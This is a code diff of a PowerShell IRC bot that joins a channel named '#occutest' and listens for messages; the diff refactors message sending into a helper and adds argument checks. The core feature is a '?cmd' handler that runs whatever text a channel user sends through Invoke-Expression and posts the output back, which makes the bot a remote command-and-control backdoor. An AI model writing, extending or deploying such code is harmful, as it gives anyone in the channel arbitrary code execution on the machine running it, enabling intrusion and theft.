@@ -1,9 +1,20 @@
+$channel = "#occutest"
+
+Function Send-ChannelMsg (
+    [Parameter(Mandatory=$True)]$Writer,
+    [Parameter(Mandatory=$True)][string]$Message) 
+{
+
+    $Writer.WriteLine("PRIVMSG $channel $Message")
+    $Writer.Flush()
+    Write-Host "--> <$channel> $Message"
+
+}
+
 Function Connect-IRCServer ( 
     [Parameter(Mandatory=$True)][String]$Hostname, 
     [Parameter(Mandatory=$True)][UInt16]$Port)
 {
-
-    $channel = "#occutest"
     
     Try
     {
@@ -41,28 +52,33 @@ Function Connect-IRCServer (
                     Write-Host "--> Joining",$channel
                     }
                 
-                #$text_stream -match '^[:](?<user>[\w]*)[!](?<host>[\w]*[@][\w.]*)[ ]([\w]*)[ ](?<channel>[+#\w]*)[ ][:][?](?<command>[\w]*)$'
                 $m = $text_stream -match '^[:](?<user>[\w]*)[!]([\w]*[@][\w.]*)[ ]PRIVMSG[ ]([+#\w]*)[ ][:][?](?<command>[\w\W]*)$'
                 if($m) {
                     if ($Matches.Count -gt 0) {
                         Write-Host "Matches the command regex"
-                        Write-Host "Match results $Matches.user $Matches.command"
+                        Write-Host "Match results:",$Matches.user,$Matches.command
                         $command,$args = $Matches.command -split " "
+                        $user = $Matches.user
                         Write-Host $command
                         Write-Host $args
                         if($command.Contains("test")) {
                                     Write-Host "Matched an actual command"
-                                    $writer.WriteLine("PRIVMSG $channel $Matches.user : Regex match.")
-                                    $writer.Flush()
+                                    #$writer.WriteLine("PRIVMSG $channel "+$Matches.user+": Regex match.")
+                                    Send-ChannelMsg -Writer $writer -Message "$user`: Regex match."
+                                    #$writer.Flush()
                                 }
                         if($command.Contains("quit")) {
                                     return
                                 }
                         if($command.Contains("cmd")) {
+                                    if(!$args) {
+                                        Send-ChannelMsg -Writer $writer -Message "No powershell command specified."
+                                        continue
+                                        }
                                     Write-Host "executing: $args"
                                     $r = iex "$args" | Out-String -Stream
                                     Write-Host $r
-                                    $writer.WriteLine("PRIVMSG $channel $r")
+                                    Send-ChannelMsg -Writer $writer -Message "$r"
                                     $writer.Flush()
                                     }
                             }
